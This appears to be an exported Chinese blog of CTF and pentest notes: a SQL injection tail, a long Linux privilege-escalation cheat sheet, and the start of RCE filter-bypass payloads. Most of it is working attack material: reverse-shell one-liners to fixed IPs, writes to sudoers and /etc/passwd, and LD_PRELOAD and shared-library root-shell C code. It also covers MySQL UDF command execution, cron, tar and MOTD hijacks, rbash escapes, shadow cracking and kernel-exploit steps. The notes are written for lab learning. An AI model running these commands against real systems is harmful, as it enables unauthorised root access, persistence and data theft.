&#x27;D:/1.txt&#x27;select 0x313233 into dumpfile &#x27;D:/1.txt&#x27;\n\n加载文件内容到字段中1LOAD DATA INFILE &#x27;/path/to/data.txt&#x27; INTO TABLE data\n\n 将该 TXT 文件中的数据加载到 data 表的 content 字段中\n查看 sql_modePIPES_AS_CONCAT 开启时\n即可执行连接语句 \ncommand1;command2\n顺序执行\ncommand1 || command2 \n如果command1执行失败，则执行command2\ncommand1 &amp;&amp; command2\n如果command1执行成功，则执行command2\n例题\nhttps://www.nssctf.cn/note/set/36\n总结\n检查闭合 不要用?xxx&#x3D;1’ and 1&#x3D;1 来判断，用?xxx&#x3D;1’ and sleep(1)判断，这样可以减少试错次数；***\n\norder by 直接从2开始*** \n\n不要忘记无闭合，如果这样的话语句最后加注释可加可不加；\n\n熟练之后可以直接从查询表明开始 即用 \n1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\nmid函数使用 ?id&#x3D;1’ union select 1,2,mid(group_concat(flag),20,20) from\n\nsys.schema_auto_increment_columns 平替 information_schema.columns\n\n\n","slug":"sql","date":"2024-10-23T02:25:59.000Z","categories_index":"ctf入门","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8253069df3e619a90109a077baa63a85","title":"提权","content":"获取交互式shell123python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echoexpotr TERM=xterm-color\n\n提权shell脚本shell.sh\n反弹shell12#!/bin/bashbash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1\n\nkali开启监听等待脚本执行\n写入sudoers12#!/bin/bashecho “用户名 ALL=(root) NOPASSWD: ALL” &gt; /etc/sudoers\n\n执行脚本后\n123sudo –l #会显示ALL=(root) NOPASSWD: ALLsudo bash #提权成功\n\n写入tmp123#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n执行脚本后\n1/tmp/rootbash -p\n\n\n\n提权手工枚举1.查看用户1234whoamiidwho  #查看还有哪些用户登录当前系统last #系统最近登陆记录\n\n2.查看系统版本和内核1234uname -a cat /etc/issuecat /proc/versionhostnamectl\n\n3.查看网络信息1234ip addrip route #查看路由表信息ip neigh #查看ip邻居arp -a #查看ip绑定的mac地址\n\n4.其他重要枚举命令12345678sudo -lgetcap -r / 2&gt;/dev/null #递归查找系统根目录 / 下所有文件的能力（capabilities）ls -laFls -liahhostname #查看当前主机在内网中的角色,显示当前主机的名称或域名，通常用于确认该主机在网络中的角色或识别主机history  #显示当前用户的命令历史记录，帮助用户查看以前执行过的命令which    #显示命令的完整路径，通常用于确认某个命令的安装位置cat /etc/fstab\n\n1cat /etc/passwd\n\n理解 &#x2F;etc&#x2F;passwd 文件含义\n我们先了解一下 /etc/passwd内容的含义：\nLinux 密码信息保存在两个文件中，分别为：/etc/passwd和 /etc/shadow\n/etc/passwd文件用于保存用户信息，每一行代表一个用户，每一行通过冒号 :分为七个部分:\n\n用户名\n密码，若为 x则表示密码保存在/etc/shadow\nUID，0 代表 root\nGID，表示所在组\n描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other\n用户主目录\n默认 shell 类型\n\n要重点关注第shell类型来判断出可利用的用户\n例如，假设 /etc/passwd文件中其中一行信息如下：\n\n其含义解读如下：\n\n用户名：test-user\n密码保存在 /etc/shadow中\nUID 为 1001\nGID 为 1001\n描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]\n用户主目录为 /home/test-user\n默认 shell 为 /bin/bash\n*由此可见，/etc/passwd文件在 linux 登录认证过程中起到非常关键的作用\n\n5.查看进程1234ps -ef #查看所有进程ps axjf #包括没有控制终端的进程ps auxtop -n 1 #指定只显示一次更新并退出。可以用来快速查看当前的进程状态\n\n\na：显示所有用户的进程。\nu：以用户为中心的格式显示进程信息，包括用户名、CPU 和内存使用情况。\nx：包括没有控制终端的进程。\nj：以作业格式显示进程信息。\nf：显示进程的树状结构，显示父子进程关系。\n\n1234netstat -anetstat -atu  #查看tcp udp端口占用情况netstat -anonetstat -s\n\n\n**-a**：显示所有连接和监听的端口。这意味着它会列出所有的活动连接以及所有正在监听的服务。\n**-n**：以数字形式显示地址和端口号，而不是尝试解析主机名和服务名称。这可以加快命令的执行速度，并避免 DNS 解析的延迟。\n**-o**：显示与每个连接相关的进程 ID（PID）。这使得你可以知道哪个进程在使用特定的网络连接。\n**-s**：显示每个网络协议的统计信息。输出包括各种协议的发送和接收数据包、出错信息、丢包情况等\n\n6.查看环境变量12echo $PATHenv\n\n7.查看定时任务1cat /etc/crontab\n\n自动化枚举\nLinpeas\nLinenum\nlinux-smart-enumeration\nlinux-exploit-suggester\nlinuxprivchecker\nunix-privesc-check\n\n12curl -L https://github.com/carlospolop/PEASS-ng/reeleases/download/20230425-bd7331ea/linpeas.shsh #Linpeas文件不落地扫描\n\n如果靶机不联网1234python -m http.server 80 #kaliwget http://xx/xx.sh | sh |nc kali的ip 8888 #靶机sudo nc -lvnp 8888 | tee linpeas.txt  #kaliless -r linpeas.txt \n\n\n在 Kali Linux 上，你启动了一个 HTTP 服务器，能够提供 xx.sh 脚本的下载。\n靶机 通过 wget 下载并执行该脚本。执行的输出通过 netcat 发送回 Kali Linux。\nKali Linux 上的 netcat 监听器接收输出，并将其保存到文件中\n\n不使用curl wget\n12cat &lt; /dev/tcp/10.10.10.10/80 |sh #靶机sudo nc -lvnp 80 &lt; linpeas.sh #kali \n\nlinux常用指令\n\nMy sql UDFUDF :user defined function123456789searchsploit UDFcat 1518.cgcc -g -c raptor_udf2.cgcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u xxxx -p\n\n前提条件secure_file_priv为空 ps:为null不行\n或者是指定目录为目标目录\n1mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select  sys_eval(&#x27;bash -c \\\\&#x27;bash -i &gt;&amp; /dev/tcp/121.43.126.238/9988 0&gt;&amp;1\\\\&#x27;&#x27;);&quot;\n\n123456789101112131415161718show variables like &#x27;%secure_file_priv%&#x27;；show variables like &#x27;%plugin%&#x27;;use mysql;create table foo(line blob);insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));select *from foo into dumpfile &#x27;/usr/lib/raptor_udIf2.so&#x27;;create function do_system returns integer soname_&#x27;raptor_udf2.so&#x27;;select * from mysql.func; #到此自定义函数成功#可以利用这个函数讲/bin/bash复制到/tmp目录下select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod 777 /tmp/rootbash&#x27;);./rootbash -c &#x27;/tmp/rootbash -i &gt;&amp; /dev/tcp/121.43.126.238/7878 0&gt;&amp;1&#x27;  \n\n123#退出数据库cd /tmprootbash -p\n\nshadow文件利用提权可读12cat /etc/shadow #如果可读cat /etc/shadow |grep &#x27;:\\$&#x27; &gt;1.txt\n\n将有hash的用户提取出来，并对hash密文进行爆破\n**$6$**是SHA-512加密的\n1sudo john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt\n\n获得明文密码进行登录\n可写1234cp /etc/shadow /tmp/shadow.bak #进行备份#将密码替换成我们自己的mkpasswd -m sha-512 Sygsdsg #-m 指定加密模式 将生成的密文进行替换#冒号之间进行替换\n\nshadow文件生成密码使用mkpasswd\n可写passwd文件利用提权1234ls -liah /etc/passwd #查看权限cp /etc/passwd /tmp/passwd.bak #备份openssl passwd Sygsdsg #将生成的密文进行替换xip #确定靶机\n\npasswds生成密码使用的是openssl\nsudo环境变量提权 （sudo -l）123sudo -l#前提env_keep+=LD_PRELOAD 可以加载动态共享库vim shell.c\n\n1234567891011#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void init() &#123;    unsetenv(&quot;LD_PRELOAD&quot;); // Remove any LD_PRELOAD environment variable.    setgid(0);               // Set the group ID to root (0).    setuid(0);               // Set the user ID to root (0).    system(&quot;/bin/bash&quot;);     // Execute a bash shell.&#125;\n\n1gcc -fPIC -shared -o shell.so shell.c -nostartfiles #编译文件\n\n\ngcc: GNU C 编译器的命令。\n-fPIC: 生成位置无关代码（Position Independent Code），这是创建共享库的必要选项。\n-shared: 指示编译器生成共享库，而不是可执行文件。\n-o shell.so: 指定输出文件的名称为 shell.so。\nshell.c: 输入的 C 源文件。\n-nostartfiles: 不链接标准启动文件。这在编译共享库时可能会用到，尤其是当你不需要标准的 C 库初始化时。\n\n会编译出一个 shell.so文件，到此，提权的脚本准备完毕，现在需要使用一个高权限用户的任意一个命令来一个执行脚本，可以知道，sudo -l 有时还会显示如下图\n\n12sudo LD_PRELOAD=/home/user/shell.so find#通过使用root的find命令，在命令执行之前预先加载我们脚本中的库\n\ncrontab文件权限提权修改文件内容12cat /etc/crontablocate xx.sh #查看目标定时任务路径\n\n查看是否有高权限用户留下定时任务，再查看定时任务有没有可写权限，如果满足，直接写入反弹shell的命令\n12echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1&quot; &gt;&gt; xx.sh #xx.sh是目标定时任务 靶机rlwrap nc -lvnp 8888#kali\n\n等待反弹shell\n修改文件路径前提，指定定时任务时不是绝对路径，如第一条\n12* * * * * root overwrite.sh* * * * * root /usr/local/bin/compress.sh\n\n12345cat /etc/crontab #会看到指定的路径PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #locate overwrite.sh\n\n若为指定路径，在执行定时任务时，会通过PATH靠前的路径寻找执行文件，可以看见第一个路径是**&#x2F;home&#x2F;user**\n12cd /home/uservi overwrite.sh #内容如下\n\n123#!/bin/bashcp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash\n\n12chmod +x overwrite.sh #等待定时任务设定时间/tmp/rootbash -p\n\n自动任务tar 的 checkpoint123456789cat  /etc/crontab#看到这个* * * * * root /usr/local/bin/compress.shcat /usr/local/bin/compress.sh 显示#!/bin/bash cd /home/user #定时任务是这个目录执行命令tar czf /tmp/backup.tar.gz #进行备份压缩文件，这是一种很常规的服务器配置命令，这里使用的tar中有checkpointtar --help #可以看到checkpoint--checkpoint-action=ACTION execute ACTION on each checkpoint #选项使用户可以定义在进程达到检查点时应该执行的操作\n\n可以知道我们进入目标目录手动添加检查点来执行脚本\n123cd /home/user touch /home/user/--checkpoint=1touch /home/user/--checkpoint-action=exec=shell.sh\n\nshell.sh可看上文的shell脚本\n等待定时任务进行\nSUID提权可利用脚本进行提权123find / -user root -perm -4000 -print 2&gt;/dev/nullfind/-perm-u=s -type f 2&gt;/dev/nullfind/-userroot-perm-4000-exec ls - 1s -1db &#123;&#125; \\;\n\nhttps://www.freebuf.com/vuls/262592.html\nhttps://www.cnblogs.com/liang-chen/p/14367408.html\n\n找查什么文件不重要（但是是存在的文件),只需要格式对，然后后面加上\nfindeg:\n1find / -name index.php -exec &quot;/bin/sh&quot; \\;\n\nexim本机给反弹shell传脚本&#96;\n1234567891011/usr/sbin/exim4 --version #查看版本searchsploit exim 4#下载提权脚本#传输提权脚本在/tmp目录下php -S localhost:8000python -m http.server 8000#开启网站之后，在靶机shell中获取wget -O myfile.txt http://example.com/file.txtcurl http://example.com/file.txt -o myfile.txt执行脚本chmod 777 xxx.sh\n\n共享库注入提权suid-so123find/-perm-u=s -type f 2&gt;/dev/null #查找可执行文件#/usr/localbin/suid-so #利用这个文件\n\n先执行这个文件\n123456strings /usr/localbin/suid-so #调试和分析共享库strace /usr/localbin/suid-so 2&gt;&amp;1 # 追踪且输出错误信息strace /usr/localbin/suid-so 2&gt;&amp;1 | grep &#x27;/home&#x27; # 仅显示home的有关信息#报出open(&quot;/home/user/.config/libcalc.so&quot;, O_FRDONLY) = -1 ENOENT (No such file or directory)#这意味着系统尝试打开指定路径下的文件 libcalc.so 但失败了\n\n这样我们就可以自己编辑libcalc.so，直接编辑成我们的提权脚本\n123mkdir .config # 新建文件夹cd .config # 切换到.config目录下vim libcalc.c # 因为目标文件是共享库，故需要先写代码，再编译成共享库文件 \n\n123456789101112131415//libcalc.c内容#include &lt;stdio.h&gt; //标准输入输出库#include &lt;stdlib.h&gt; //C语言标准库#include &lt;unistd.h&gt; //包含setuid和setgid的库//static表示该函数为静态函数，仅在当前文件中可见；//__attribute__((constructor))：gcc特有，用于指定函数再程序加载时被自动调用。当程序启动时，编译器会在所有普通的全局和静态变量初始化之后，再main函数执行之前调用这个被标记的函数。static void inject() __attribute__((constructor));void inject()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:以root身份启动shell&#125;\n\n12gcc -shared -fPIC -o libcalc.so libcalc.c # 编译usr/local/bin/suid-so #再次执行时，即可提权成功\n\n环境变量利用提权suid-env1find/-perm-u=s -type f 2&gt;/dev/null\n\n这里关注/usr/localbin/suid-env文件，执行程序，并用strings查看程序中出现的可打印字符\n1strings /usr/localbin/suid-env \n\n#看到\n\n这里用service命令启动apache服务，service apache2 start。因为这里的service用的是相对路径，而相对路径就与环境变量中的PATH有关，当试图启动apache服务时，系统会去PATH里，按照路径的先后顺序依此寻找service脚本。这里就可以通过更改环境变量中的PATH实现提权。\n1vim service.c\n\n123456789#include &lt;stdio.h&gt; //标准输入输出库#include &lt;stdlib.h&gt; //C语言标准库#include &lt;unistd.h&gt; //包含setuid和setgid的库void main()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:以root身份启动shell&#125;\n\n1gcc -o service service.c\n\n123echo $PATH # 查看当前$PATH变量export PATH=.:$PATH # 将当前路径加入到$PATH中/usr/localbin/suid-env #再次执行，进行提权\n\n\n\n巧用SUID-shell功能提权suid-env2bash&lt;4.21find / -perm -u=s -type f 2&gt;/dev/null\n\n\n\n此处利用点是/usr/local/bin/suid-env2\n1strings  /usr/local/bin/suid-env2\n\n看到apache服务启动\n\n如果看到这个要想到去查看bash版本是否小于4.2.0\n1bash --version\n\nbash小于4.2是，可以自定义函数，用路径的组合作文件名\n我们可以劫持启动apache时的路径，自定义一个函数\n123function /usr/sbin/service &#123; /bin/bash -p; &#125; #自定义函数 调用bash  -p 选项使得新 shell 具有用户的权限export -f /usr/sbin/service #导出 shell 函数，当前 shell 中运行的任何子shell 都能访问该函数/usr/local/bin/suid-env2   #运行目标文件\n\nbash&lt;4.41find / -perm -u=s -type=f 2&gt;/dev/null\n\n1env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#x27;   /usr/local/bin/suid-env2\n\n\nenv -i:\n-i 选项会清空当前的环境变量，提供一个干净的环境。\n\n\nSHELLOPTS=xtrace:\nSHELLOPTS 是一个环境变量，用于控制 shell 的行为。在这里，xtrace 是一种选项，用于开启追踪模式，这样每个命令在执行前会被打印到标准错误输出。\n\n\nPS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;:\nPS4 变量用于定义在追踪模式下打印的命令前缀。在这里，它会在追踪时执行一个命令：复制 /bin/bash 到 /tmp/rootbash 并设置其 SUID 位。这意味着 /tmp/rootbash 在被执行时会以文件所有者的权限运行。\n\n\n/usr/local/bin/suid-env2:\n最后，运行位于 /usr/local/bin 下的 suid-env2 可执行文件。\n\n\n\n总体作用\n这个命令的目的是在一个干净的环境中，运行 suid-env2 程序，并在执行过程中设置 PS4 以复制 bash，并给予新复制的文件 SUID 权限。\n密码和密钥文件查看历史文件123history #查看是否有信息泄露 根目录 家目录cat ~/.*history | lessls -liah #查看viminfo \n\n\n\n看到mysql登录信息，即可以尝试su切换身份\n配置文件123ls -liah #查看myvpn.ovpn 家目录 根目录cat myvpn.ovpn #查看是否存在密码信息cat /etc/openvpn/auth.txt #找到密码\n\n\n\nSSH密钥敏感信息提权1ls -laih #寻找.ssh 家目录 根目录\n\n拿到密钥之后进行登录\n12345678sudo ssh -i id_rsa root@10.10.32.160#提示Unable to negotiate with 10.10.32.160 port 22: no maatching host key type found.Their offer: ssh-rsa,ssh-dss#指定算法sudo ssh -i id_rsa  -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@10.10.32.160#提示sign_and_send_pubkey: no mutual signature supportedsudo ssh -i id_rsa  -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@10.10.32.160#登陆成功\n\n\n\nNFS提权NFS（Network File System） 服务器托管共享文件系统\n1cat /etc/exports #查看NFS信息\n\n\n\n关键利用点no_root_squash\n1234mkdir /tmp/nfs #创建挂载目录mount -o rw,vers=3 10.10.10.12:/tmp/tmp/nfs #进行挂载 vers（版本）小于4msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -felf -o /tmp/nfs/shell.elf #使用msf生成提权文件到挂载目录中./shell.elf\n\n\n\n内核利用提权1234查看发行版本cat /etc/issue cat/etc/*-releaseuname-a\n\n传输linpeas脚本可以看自动化枚举\nnc传输方式本地下载好后\n12nc -lvnp 80 &lt; linpeas.sh #kalicat &lt; /dev/tcp/192.168.38.130/80 | sh\n\nwget传输方式123456python -m http.server 80 #kali#或者 php -S 0:80 #kaliwget http://xx/xx.sh | sh |nc kali的ip 8888 #靶机sudo nc -lvnp 8888 | tee linpeas.txt  #kaliless -r linpeas.txt \n\n运行linpeas脚本进行扫描\n这样我们就得到了系统的内核提权的脚本\n可以用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码,也可以直接去网上搜索\nsearchsploit linux Debian 查看内核漏洞poc\nsearchsploit -p 19256 查看漏洞poc相关内容  or  github搜索提权\ndoas less+vi提权openbsd freebsd系统（一般用于防火墙应用）\n1find / -perm -u=s 2&gt;/dev/null \n\n查看利用文件/usr/bin/doas\n123cat /etc/doas.conf #查看配置文件permit nopass keepenv user as root  cmd  usr/bin/less  args  /var/log/authlog#相当于sudo -l\n\ncmd usr/bin/less: 指定要执行的命令，这里是 less，通常用于查看文件内容。\nargs /var/log/authlog: 指定传递给命令的参数，这里是 /var/log/authlog，表示要查看的日志文件。\n1doas /usr/bin/less /var/log/authlog\n\n进入到编辑文件页面之后，再退出时输入!sh切换至root\n\n利用MOTD机制提权123cat /etc/* #查找利用文件update-motd.dcd /etc/update-motd.dcat 00-header\n\n我们通过ssh登录成功后看到的那些欢迎和提示的信息都是motd目录下存放的这些sh脚本所提供的\n当我们通过ssh登录成功的时候，这些sh脚本会以root权限运行输出那些欢迎信息和日期等等，并且我们当前这个\n用户对这些文件可读可写，那么提权思路就有了\n12echo &#x27;bash -c &quot;bash -i &gt; &amp; /dev/tcp/192.168.38.130/8888 0&gt;&amp;1&quot;&#x27; &gt;&gt;  00-header #靶机rlwrap nc -lvnp 8888 #kali\n\n再次登录反弹shell成功\n可预测PRNG暴力破解SSH提权PRNG（伪随机数生成器）\n1searchsploit prng\n\n将密码集下载到本机中 (&#x2F;ss)\n12cat /home/user/.ssh/authorized_keys 0  #将显示出来的公钥截取一段，在密码集目录中搜索grep -lr &quot;AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuI&quot;\n\n将显示出来的**.pub**文件比较 （.pug的是公钥，没有后缀的是私钥）\n再找到相对应的私钥\n\n再使用私钥进行ssh登录\n12345sudo ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@10.10.10.25#登陆失败，加上参数sudo ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -v#-v debug查看发现是公钥类型没定义，再添加一个参数sudo ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@10.10.10.25 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss\n\n-oHostKeyAlgorithms=ssh-rsa,ssh-dss: 指定主机密钥算法，这里表示允许 ssh-rsa 和 ssh-dss\n-oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss: 指定接受的公钥类型，允许 ssh-rsa 和 ssh-dss\n登陆成功\n脏牛提权1.先在&#x2F;tmp目录上传(rz)脏牛文件， ps:&#x2F;tmp任意用户都有操作权限\n2.编译脏牛文件 gcc -pthread dirty.c -o dirty -lcrypt\n\n3.执行文件   ./dirty   \nsudo提权2021年1月26日,Sudo发布安全通告,修复了一个类Unix操作系系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时,它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时,实际上并未进行转义,从而可能导致缓冲区溢出。因此只要存在sudoers文件(通常是&#x2F;etc&#x2F;sudoers),攻击者就可以使用本地普通用户利用sudo获得系统root权限。目前漏洞细节已公开,请受影响的用户尽快采取措施进行防护。相关文章:Linux中su和sudo的用法和区别https://xie1997.blog.csdn.net/article/details/99710793\n1234漏洞影响版本Sudo 1.8.2 - 1.8.31p2Sudo 1.9.0 - 1.9.5p1不受影响版本:sudo=&gt;1.9.5p2\n\nsudo --version 查看sudo版本\nsudo -l``sudo -l 命令用于列出当前用户可以执行的 sudo 命令和相关权限\n检测是否存在漏洞,使用普通用户执行下面的命令sudoedit -s /\n若返回如图以”sudoedit:”开头的错误,则当前系统可能存在安全风险不受影响的系统将显示以”usage:”开头的错误\npoc下载地址 https://github.com/blasty/CVE-2021-3156\n进入下载目录 make编译安装\ngit提权12345sudo git help config\t!/bin/bash或者！&#x27;sh&#x27;完成提权 sudo git  -p help\t!/bin/bash\n\n\n-exec “&#x2F;bin&#x2F;sh” ; \nrbash如何设置rbash12useradd -s /bin/rbash test # 设置用户test登陆的shell为rbashmkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令\n\n会限制一些行为，让一些命令无法执行\nrbash逃逸做信息收集枚举环境变量\n查看当前的环境变量设置。特别是**PATH和SHELL变量**，它们可能影响到命令的查找和执行\n123456declare -xtypeset -xexportenvprintenvecho $PATH\n\n检查关于rbash逃逸可用应用和服务文本编辑器：如vi、vim、nano等，这些编辑器有时候允许用户执行系统命令。\n其他系统工具：如ftp，more，less，man等，这些工具在特定情况下也可用于执行命令逃逸\n调试工具：如gdb，在某些配置下可能允许用户执行任意代码\n枚举可用的命令和操作符命令枚举：检查哪些命令在rbash环境中是可用的。这通常包括一些基本的文件操作命令（如ls、cat、echo等），以及可能未被禁用的系统命令。\n操作符枚举：尝试使用重定向操作符（如&gt;、&gt;&gt;、&lt;等）和管道操作符（|），以评估它们是否可用。这些操作符在构建逃逸命令时可能非常有用。\n检查可用编程语言1python  perl  ruby  php  java等\n\n用户和sudo权限\n用户权限：了解当前用户的权限范围，包括可以访问哪些文件和目录。\nsudo权限：使用sudo -l命令查看当前用户是否有sudo权限以及可以执行哪些命令。这有助于评估是否可以通过sudo命令绕过rbash限制。\n\n1.“&#x2F;”字符被允许了txt如果/被允许我们可以直接运行：/bin/bash2.cp命令被允许12345#可以直接复制/bin/bash到本地用户目录cp /bin/bash test1cp /bin/sh test2./test1 # 切换到了/bin/bash./test2 # 切换到了/bin/sh\n\n3.常见工具探测系统中是否存在常见工具\nman git12man &gt; !/bin/shgit &gt; git help status\n\nFTP，GDB12ftp &gt; !/bin/shgdb &gt; !/bin/sh\n\nvi&#x2F;vim12vim test!/bin/sh # 利用在vi/vim中可以执行命令的特点\n\ned-editor12ed!&#x27;/bin/sh&#x27;\n\nfind12find / -name SomeName -exec /bin/sh \\;find / -name SomeName -exec /bin/bash \\;\n\nmore&#x2F;less12more test!/bin/sh # 同样也是利用打开文件后可以在下面运行命令的特\n\n4.set shell在一些编辑器中可以设置shell变量然后执行，如vim中\n123456#vim/vi进入之后set shell=/bin/sh # 或者用/bin/bashshell#切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/\n\n5.更改PATH或SHELL环境变量1234export -p # 查看系统的环境变量设置 PATH 和 SHELL 变量的权限设置很可能是：“-rx” ，这就意味着我们只能执行和读取，不能写入。如果有w权限的话，我们可以直接给它写入export PATH=$PATH:/bin/:/usr/bin:$PATHexport SHELL=/bin/sh\n\n6.编程语言语言可以帮助我们切换shell的类型\n(1) python12python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\n\n(2) php1php -a then exec(&quot;sh -i&quot;)\n\n(3) perl1perl -e &quot;exec &#x27;/bin/sh&#x27;;&quot;\n\n(4) lua1os.execute(&#x27;/bin/sh&#x27;)\n\n(5) ruby1exec &quot;/bin/sh&quot;\n\n7.其他可以尝试的方法ssh1234ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;ssh username@IP -t &quot;bash --noprofile&quot;ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)\n\nzip1zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;\n\ntar1tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\nawk**(超级玛丽靶机使用它成功了)**1awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; \n\n8.切换用户时逃逸这里的原理涉及到su 和 su- 的区别：\nsu命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的\nsu- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为&#x2F;root&#x2F;，环境变量也变\n123su -l twsu - twsu --login tw\n\n9.另类方法(DC-2靶机使用它成功了)12345# 利用bash_cmds自定义一个shellBASH_CMDS[cat]=/bin/sh;cat# 添加环境变量export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin\n\nTeeheeteehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权\n核心思路就是利用其在passwd文件中追加一条uid为0的用户条目\n1echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; | sudo teehee -a /etc/passwd\n\n这条命令的作用是将 &quot;raaj::0:0:::/bin/bash&quot; 这行文本追加到 /etc/passwd 文件中，类似于\n12echo &quot;sygsdsg::0:0:sygsdsg:/root:/bin/bash&quot; &gt; temp.txtsudo teehee -a /etc/passwd &lt; temp.txt\n\n按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。这个用户因为uid为0，所以也是root权限\n\n补充\n\n/etc/passwd 文件：包含用户的基本信息，比如用户名、用户ID（UID）、组ID（GID）和默认shell等。\n\n/etc/shadow 文件：存储用户的密码和相关的安全信息。\n没有 shadow 条目：如果某个用户在 /etc/shadow 中没有相应的条目，这意味着该用户没有设置密码或其密码是空的。\n密码条目为空：如果 /etc/passwd 中该用户的密码字段为空，且没有相应的 shadow 条目，表示可以使用空密码登录。\n\n\n\ncrontab提权前置知识\nhttps://www.runoob.com/w3cnote/linux-crontab-tasks.html\n","slug":"提权","date":"2024-10-22T11:03:03.000Z","categories_index":"渗透","tags_index":"内网渗透","author_index":"Sygsdsg"},{"id":"15453c383c32a99612ffdb75790c3ef8","title":"rce","content":"命令执行相对地址 &#x2F;flag.php 绝对地址**&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php**\n1.复制文本内容Web30​    url&#x2F;?c&#x3D;echo cp fl\\*g.p\\*p 1.txt; 将flag.php的内容复制到1.txt中\n​    url&#x2F;?c&#x3D;echo mv fl\\*g.p\\*p 1.txt;\n​    访问url&#x2F;1.txt 获取文本内容\n2.嵌套命令执行Web31l url&#x2F;?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘cat flag.php’);  ‘1’参数逃逸出去不受过滤限制\nWeb32l url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;fla\ng.php       ps:用include逃逸参数 要搭配文件读取使用\nurl&#x2F;?c&#x3D;require%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php ;分号被过滤 可替换成?&gt;\n3.文件包含命令执行Web37​    出现include($c) include($c.php)或代码即可用文件包含 使用data伪协议\nurl&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,\nweb38url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 短标签\n4.无参数RCEWeb40url&#x2F;?c&#x3D;print_r(get_defined_vars()); 获取并打印当前作用域中所有已定义的变量的数组\n即可自定义一个变sy量 eg:1&#x3D;phpinfo(); \n​                               \nurl&#x2F;?c&#x3D;print_r(next(get_defined_vars()));\n**next()** 是 PHP 中用于将数组中的内部指针向前移动并返回当前元素的函数\nurl&#x2F;?c&#x3D;print_r(array_pop(next(get_defined_vars()))); 弹出数组值\nurl&#x2F;?c&#x3D;eval(array_pop(next(get_defined_vars()))); 执行命令 \n \n5. shell 重定向操作Web42&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 命令的标准输出（stdout）和标准错误（stderr）都被重定向到 &#x2F;dev&#x2F;null 即可双写绕过\nurl&#x2F;?c&#x3D;cat flag.php;ls\nweb43 过滤分号\nurl&#x2F;?c&#x3D;cat flag.php&amp;&amp;ls\nweb45 过滤空格\nurl&#x2F;?c&#x3D;tac%09fl*.php%26%26ls\n6.Web50​    nl&lt;flag.php||ls 这种方式不支持* ？通配符\n​    nl&lt;fla’’g.php||ls  shell特性 用 ‘’ 分隔，命令执行时会自动忽略\n7. web52 